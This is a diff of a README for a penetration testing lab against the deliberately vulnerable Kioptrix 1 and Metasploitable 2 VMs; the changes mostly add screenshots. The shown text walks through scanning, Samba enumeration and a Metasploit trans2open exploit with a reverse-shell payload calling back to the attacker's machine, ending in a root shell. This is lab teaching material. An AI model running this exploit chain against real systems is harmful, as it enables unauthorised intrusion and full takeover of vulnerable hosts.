@@ -1,4 +1,4 @@
-# Cybersecurity Penetration Testing Lab for Kioptrix 1 and Metasploitable 2
+<img width="1536" height="713" alt="Screenshot_2026-09-02_08_58_00" src="https://github.com/user-attachments/assets/8c8c102e-e771-484e-9bee-2dfaededc228" /># Cybersecurity Penetration Testing Lab for Kioptrix 1 and Metasploitable 2
 
 A full penetration testing exercise against two classic intentionally-vulnerable VMs — Kioptrix: Level 1 and Metasploitable 2 — covering the complete attack chain: reconnaissance, enumeration, exploitation, gaining root access, and post-exploitation.
 
@@ -54,6 +54,8 @@ sudo netdiscover -r <your_subnet>/24
 # e.g. sudo netdiscover -r 172.20.10.0/24
 ```
 
+<img width="1536" height="713" alt="Screenshot_2026-09-02_08_20_53" src="https://github.com/user-attachments/assets/7ceddf0f-18aa-452c-9be3-4660f11594fe" />
+
 An initial quick scan confirms the host is up and reachable:
 
 ```bash
@@ -73,6 +75,8 @@ nmap <KIOPTRIX_IP>
 ```bash
 smbclient -L <KIOPTRIX_IP>
 ```
+
+<img width="1536" height="713" alt="Screenshot_2026-09-02_08_22_39" src="https://github.com/user-attachments/assets/472b7d7c-6738-401d-841a-77ea10f80496" />
 
 ```
 Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
@@ -109,6 +113,8 @@ msf6 auxiliary(scanner/smb/smb_version) > run
 [*] <KIOPTRIX_IP>:        - Scanned 1 of 1 hosts (100% complete)
 ```
 
+<img width="1536" height="713" alt="Screenshot_2026-09-02_08_27_54" src="https://github.com/user-attachments/assets/dbe5ba38-b33a-4ec4-b847-59e5db861eb7" />
+
 Confirms the same version (2.2.1a) independently — two tools agreeing on the exact version builds confidence before selecting an exploit.
 
 ### 3. Vulnerability Research
@@ -119,9 +125,13 @@ Search Exploit-DB locally via `searchsploit`:
 searchsploit samba 2.2
 ```
 
+<img width="1536" height="713" alt="Screenshot_2026-09-02_08_28_30" src="https://github.com/user-attachments/assets/a5a125e0-67ab-4e65-9c5d-36b5a7bad50e" />
+
 Searching the exact version (`2.2.1a`) returns nothing — Exploit-DB entries are typically indexed by version ranges, not exact patch strings. Searching the shortened version (`2.2`) surfaces multiple matches, including several `trans2open` buffer overflow entries across different platforms (Linux x86, *BSD x86, Mac OS X PPC, Solaris SPARC).
 
 A quick web search for "Samba 2.2.1a exploits" confirms `trans2open` as the well-documented, recurring exploit for this exact version, along with Metasploit as the standard tool used to weaponize it.
+
+<img width="1536" height="713" alt="Screenshot_2026-09-02_08_29_36" src="https://github.com/user-attachments/assets/597fa342-8540-485b-b0c3-9dd1673ae584" />
 
 ### 4. Exploitation
 
@@ -131,6 +141,8 @@ Launch Metasploit and search for the exploit:
 msfconsole
 msf6 > search trans2open
 ```
+
+<img width="1536" height="713" alt="Screenshot_2026-09-02_08_54_59" src="https://github.com/user-attachments/assets/c1657d1f-7935-4c81-bfb1-0723a8cb96d8" />
 
 ```
 Matching Modules
@@ -174,6 +186,8 @@ msf6 exploit(linux/samba/trans2open) > set LHOST <KALI_IP>
 msf6 exploit(linux/samba/trans2open) > options
 ```
 
+<img width="1536" height="713" alt="Screenshot_2026-09-02_08_58_00" src="https://github.com/user-attachments/assets/d2677793-877a-44a5-ac24-b8d77d973a37" />
+
 ```
 Payload options (linux/x86/shell_reverse_tcp):
    Name   Current Setting  Required  Description
@@ -188,6 +202,8 @@ Run the exploit:
 ```bash
 msf6 exploit(linux/samba/trans2open) > run
 ```
+
+<img width="1536" height="713" alt="Screenshot_2026-09-02_08_58_44" src="https://github.com/user-attachments/assets/59abfe30-5239-498c-9d7f-32bdf860297e" />
 
 ```
 [*] Started reverse TCP handler on <KALI_IP>:4444
@@ -205,6 +221,8 @@ Verify:
 ```bash
 whoami
 ```
+
+<img width="1536" height="713" alt="Screenshot_2026-09-02_08_58_51" src="https://github.com/user-attachments/assets/63ea14e4-2e58-4b90-968d-5ebef76f60f6" />
 
 ```
 root
